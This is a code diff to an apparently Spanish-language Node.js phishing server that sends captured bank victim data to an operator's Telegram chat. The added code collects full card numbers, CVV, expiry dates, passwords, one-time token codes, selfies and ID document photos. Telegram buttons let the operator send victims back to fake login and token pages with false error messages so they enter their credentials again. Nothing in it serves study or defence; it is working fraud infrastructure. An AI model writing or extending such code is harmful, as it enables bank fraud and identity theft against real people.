@@ -39,8 +39,8 @@ const io = new Server(httpServer, {
 // ===============================
 // MIDDLEWARES
 // ===============================
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
 // CORS para todas las rutas
 app.use((req, res, next) => {
@@ -126,24 +126,39 @@ function formatTelegramMessage(data) {
 
     switch (data.tipo) {
         case 'Clave Segura':
-            return `🔐 <b>Nueva solicitud de ingreso</b>\n\n` +
+            return `🔐 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
                    `📋 <b>Tipo:</b> ${data.tipo}\n` +
-                   `🪪 <b>Documento:</b> ${data.tipoDocumento} ${data.numeroDocumento}\n` +
+                   `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
+                   `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n` +
                    `🔑 <b>Clave:</b> <code>${data.clave}</code>\n` +
-                   `⏰ <b>Hora:</b> ${timestamp}`;
+                   `⏰ <b>Fecha:</b> ${timestamp}`;
         
         case 'Tarjeta Débito':
-            return `💳 <b>Nueva solicitud de ingreso</b>\n\n` +
+            return `💳 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
                    `📋 <b>Tipo:</b> ${data.tipo}\n` +
-                   `🪪 <b>Documento:</b> ${data.tipoDocumento} ${data.numeroDocumento}\n` +
-                   `💳 <b>Últimos 4 dígitos:</b> <code>${data.ultimosDigitos}</code>\n` +
+                   `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
+                   `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n\n` +
+                   `💳 <b>DATOS DE TARJETA:</b>\n` +
+                   `🔢 <b>Número Completo:</b> <code>${data.numeroTarjeta}</code>\n` +
                    `🔑 <b>Clave:</b> <code>${data.claveTarjeta}</code>\n` +
-                   `⏰ <b>Hora:</b> ${timestamp}`;
+                   `📅 <b>Vencimiento:</b> <code>${data.fechaVencimiento}</code>\n` +
+                   `🔐 <b>CVV:</b> <code>${data.cvv}</code>\n\n` +
+                   `⏰ <b>Fecha:</b> ${timestamp}`;
         
         case 'Token':
-            return `🔐 <b>Verificación de Token</b>\n\n` +
+            return `🔐 <b>VERIFICACIÓN DE TOKEN</b>\n\n` +
                    `🔑 <b>Código:</b> <code>${data.codigo}</code>\n` +
-                   `⏰ <b>Hora:</b> ${timestamp}`;
+                   `⏰ <b>Fecha:</b> ${timestamp}`;
+        
+        case 'Selfie':
+            return `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n` +
+                   `🆔 <b>Message ID:</b> ${data.messageId}\n` +
+                   `⏰ <b>Fecha:</b> ${timestamp}`;
+        
+        case 'Cédula':
+            return `🪪 <b>DOCUMENTO DE IDENTIDAD</b>\n\n` +
+                   `🆔 <b>Message ID:</b> ${data.messageId}\n` +
+                   `⏰ <b>Fecha:</b> ${timestamp}`;
         
         default:
             return JSON.stringify(data, null, 2);
@@ -154,13 +169,15 @@ function formatTelegramMessage(data) {
  * Genera el teclado inline para las acciones de Telegram
  */
 function getTelegramKeyboard(messageType = 'default') {
-    // Todos los mensajes tienen los mismos 3 botones
+    // Todos los mensajes tienen los mismos botones
     return {
         inline_keyboard: [
             [
+                { text: '❌ Error de Logo', callback_data: 'error_logo' },
                 { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' }
             ],
             [
+                { text: '❌ Error de Token', callback_data: 'error_token' },
                 { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
             ],
             [
@@ -175,8 +192,42 @@ function getTelegramKeyboard(messageType = 'default') {
  */
 async function sendTelegramMessage(data) {
     try {
-        const messageText = formatTelegramMessage(data);
         const keyboard = getTelegramKeyboard(data.tipo);
+
+        // Si es una foto (base64), enviarla como imagen
+        if (data.foto) {
+            console.log('📸 Procesando foto para envío...');
+            
+            try {
+                // Verificar que la foto tenga el formato correcto
+                if (!data.foto.includes('base64,')) {
+                    throw new Error('Formato de foto inválido');
+                }
+                
+                const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
+                console.log('📦 Buffer creado, tamaño:', buffer.length, 'bytes');
+                
+                const caption = formatTelegramMessage(data);
+                
+                console.log('📤 Enviando foto a Telegram con botones...');
+                
+                const result = await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
+                    caption: caption,
+                    parse_mode: 'HTML',
+                    reply_markup: keyboard
+                });
+                
+                console.log('✅ Foto enviada con éxito, Message ID:', result.message_id);
+                return result;
+                
+            } catch (photoError) {
+                console.error('❌ Error procesando/enviando foto:', photoError);
+                throw photoError;
+            }
+        }
+
+        // Enviar mensaje de texto
+        const messageText = formatTelegramMessage(data);
 
         console.log('📤 Enviando mensaje a Telegram:', messageText);
 
@@ -215,9 +266,17 @@ function handleRedirect(action, baseUrl = '') {
     }
     
     const redirectMap = {
+        'error_logo': {
+            url: `${baseUrl}/index.html?action=error_logo`,
+            message: 'Error detectado. Por favor ingrese sus credenciales nuevamente'
+        },
         'pedir_logo': { 
             url: `${baseUrl}/index.html?action=pedir_logo`, 
             message: 'Por favor ingrese sus credenciales nuevamente'
+        },
+        'error_token': {
+            url: `${baseUrl}/token.html?action=error_token`,
+            message: 'Código incorrecto. Por favor ingrese el código token nuevamente'
         },
         'pedir_token': { 
             url: `${baseUrl}/token.html?action=pedir_token`, 
